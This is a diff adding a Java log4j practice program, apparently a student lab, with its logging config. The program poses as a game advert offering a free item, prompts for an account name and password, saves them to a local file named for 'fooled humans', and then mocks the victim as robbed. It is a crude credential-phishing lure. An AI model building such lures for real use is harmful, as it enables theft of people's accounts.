@@ -1,0 +1,98 @@
+package lab;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.util.Scanner;
+import org.apache.log4j.Logger;
+
+public class KeyBoardRecorder {
+	private static Logger logger = Logger.getLogger(KeyBoardRecorder.class.getName());
+
+	public static void main(String[] args) {
+		// TODO 自动生成的方法存根
+		// System.out.println("贪玩蓝月，装备回收交易自由，原来装备真能换钱啊！");
+		logger.debug("贪玩蓝月，装备回收交易自由，原来装备真能换钱啊！");
+		// System.out.println("登录即获得价值999rmb的屠龙宝刀!!!!");
+		logger.debug("登录即获得价值999rmb的屠龙宝刀!!!!");
+		// System.out.println("登录（请输入贪玩蓝月账号名和密码,以分号分隔）");
+		logger.debug("登录（请输入贪玩蓝月账号名和密码,以分号分隔）");
+		for (; true;) {
+			Scanner sn = new Scanner(System.in);
+			String cac = sn.nextLine();
+			try {
+			String[] countandcode = cac.split(";");
+			if (cac.isEmpty()) {
+				//System.out.println("账户密码为空，请重新输入");
+				logger.debug("账户密码为空，请重新输入");
+			} else {
+				String count = countandcode[0];
+				String zhanghu = "用户名：";
+				String code = countandcode[1];
+				String mima = "密码:";
+				File file = new File("C:\\Users\\黎炜俊\\Desktop\\Java哈哈哈\\上当的人类的账号和密码.txt");
+				FileOutputStream shuchu = new FileOutputStream(file, true);
+				try {
+					byte[] ZhangHu = zhanghu.getBytes();
+					byte[] Count = count.getBytes();
+					byte[] MiMa = mima.getBytes();
+					byte[] Code = code.getBytes();
+					shuchu.write(ZhangHu);
+					shuchu.write(Count);
+					shuchu.write(' ');
+					shuchu.write(MiMa);
+					shuchu.write(Code);
+					//System.out.println("啊哈哈哈啊哈哈");
+					//System.out.println("恭喜你，你的账号和密码已经被盗，我将清空你的装备XD");
+					logger.debug("恭喜你，你的账号和密码已经被盗，我将清空你的装备XD");
+					//System.out.println("还想要屠龙刀？我上次才给古天乐打掉一把，如今要报复社会");
+					logger.debug("还想要屠龙刀？我上次才给古天乐打掉一把，如今要报复社会");
+					//System.out.println("啊哈哈哈啊哈哈");
+					logger.debug("啊哈哈哈啊哈哈");
+				} catch (IOException e) {
+					System.out.println(e.getMessage());
+				} finally {
+					shuchu.close();
+				}
+			}
+			}catch(Exception e) {
+				try {
+					logger.error("异常简要说明："+e.toString());
+					logger.error("异常详细说明："+e.getMessage());
+					logger.error("异常发生位置："+e.getStackTrace());
+					logger.error("输出栈追踪");
+					e.printStackTrace();
+					throw new KeyRecorderException("用户名和密码输入格式错误，请重新输入");
+				} catch (KeyRecorderException e1) {
+					// TODO 自动生成的 catch 块
+					e1.printStackTrace();
+				}
+			}
+		}
+
+	}
+
+}
+
+class KeyRecorderException extends Exception {
+	KeyRecorderException() {
+		super();
+	}
+
+	KeyRecorderException(String str) {
+		super();
+	}
+}
+============================================================================================================
+（log4j.properties配置）
+### \u8BBE\u7F6ELogger\u8F93\u51FA\u7EA7\u522B\u548C\u8F93\u51FA\u76EE\u7684\u5730 ###
+log4j.rootLogger=debug, stdout,logfile
+### \u628A\u65E5\u5FD7\u4FE1\u606F\u8F93\u51FA\u5230\u63A7\u5236\u53F0 ###
+log4j.appender.stdout=org.apache.log4j.ConsoleAppender
+log4j.appender.stdout.Target=System.err
+log4j.appender.stdout.layout=org.apache.log4j.SimpleLayout
+### \u628A\u65E5\u5FD7\u4FE1\u606F\u8F93\u51FA\u5230\u6587\u4EF6\uFF1Ad:/keyboardrecorder.log ###
+log4j.appender.logfile=org.apache.log4j.FileAppender
+log4j.appender.logfile.File=d:/keyboardrecorder.log
+log4j.appender.logfile.layout=org.apache.log4j.PatternLayout
+log4j.appender.logfile.layout.ConversionPattern=%d{yyyy-MM-dd HH:mm:ss} %l %F %p %m%n
